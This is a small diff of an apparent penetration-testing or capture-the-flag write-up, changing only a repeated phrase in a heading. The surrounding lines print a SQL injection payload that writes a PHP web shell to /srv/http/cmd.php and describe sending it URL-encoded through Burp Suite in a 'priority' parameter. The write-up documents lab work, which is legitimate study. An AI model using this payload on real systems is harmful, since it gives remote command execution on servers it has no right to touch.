@@ -436,7 +436,7 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221011103926.png)
 
-#### -URL encoded the following the following commands:
+#### -URL encoded the following commands:
 "' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'"
 
 #### -Added "priority='' paramater and the URL encoded syntax above into Burpsuite and forwarded the request:
